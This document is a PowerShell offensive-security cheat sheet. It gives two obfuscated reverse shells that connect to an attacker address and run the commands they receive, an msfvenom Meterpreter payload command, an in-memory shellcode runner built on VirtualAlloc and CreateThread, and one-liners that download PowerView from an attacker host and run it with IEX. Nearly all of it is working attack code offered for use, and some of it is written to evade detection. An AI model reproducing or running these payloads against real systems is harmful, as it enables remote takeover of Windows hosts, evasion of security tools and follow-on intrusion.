---
title: PowerShell
sidebar_position: 1
---

### **Obfuscated Reverse Shell**

**Option 1**

```powershell
$amit = New-Object System.Net.Sockets.TCPClient("[ATTACER_IP]",[PORT]);
$amit = $amit.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $amit.Read($bytes, 0, $bytes.Length)) -ne 0){;
$bruh = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$dback = (iex ". { $bruh } 2>&1" | Out-String );
$dback2  = $dback + "[" +$ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath('.\') +"]" + " PS > ";
$sdata =([text.encoding]::ASCII).GetBytes($dback2);
$amit.Write($sdata,0,$sdata.Length);
$amit.Flush()};
$amit.Close()

```

**Option 2 - Highly Obfuscated**

```powershell
$apple = "172x16x196x1_8080" # Your IP address and port
$apple = $apple -replace 'x', '.'

$banana = $apple.LastIndexOf('_')
$cherry = $apple.Substring(0, $banana)
$date = [int]$apple.Substring($banana + 1)

try {
    $cherry = New-Object System.Net.Sockets.TcpClient($cherry, $date)
    $date = $cherry.GetStream()
    $elderberry = New-Object IO.StreamWriter($date)
    $elderberry.AutoFlush = $true
    $fig = New-Object IO.StreamReader($date)
    $elderberry.WriteLine("(c) Microsoft Corporation. All rights reserved.`n`n")
    $elderberry.Write((pwd).Path + '> ')

    while ($cherry.Connected) {
        $grape = $fig.ReadLine()
        if ($grape) {
            try {
                # Display the command after the prompt and execute it
                $honeydew = Invoke-Expression $grape 2>&1 | Out-String
                $elderberry.WriteLine($grape)
                $elderberry.WriteLine($honeydew)
                $elderberry.Write((pwd).Path + '> ')
            } catch {
                $elderberry.WriteLine("ERROR: $_")
                $elderberry.Write((pwd).Path + '> ')
            }
        }
    }
} catch {
    exit
}

```

### **Meterpreter Reverse Shell**

```bash
# If something is not working consider using 32-bits payloads (windows/meterpreter/reverse_http)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=[LHOST] LPORT=[LPORT] EXITFUNC=thread -f ps1

```

```powershell
function getDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )

    $type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',
      [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
      SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
      SetImplementationFlags('Runtime, Managed')

    return $type.CreateType()
}

function LookupFunc {
    Param ($moduleName, $functionName)

    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

$VirtualAllocAddr = LookupFunc kernel32.dll VirtualAlloc
$VirtualAllocDelegateType = getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegateType)
$VirtualAlloc.Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

# Replace with shellcode malicious code
[Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0,......

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)

```

### **Load Directly Into Memory (Reflective One-Liners)**

- **Proxy-aware**

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://[ATTACKER_IP]/PowerView.obs.ps1')

```

- **Non-proxy aware**

```powershell
$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://[ATTACKER_IP]/PowerView.obs.ps1',$false);$h.send();iex $h.responseText

```
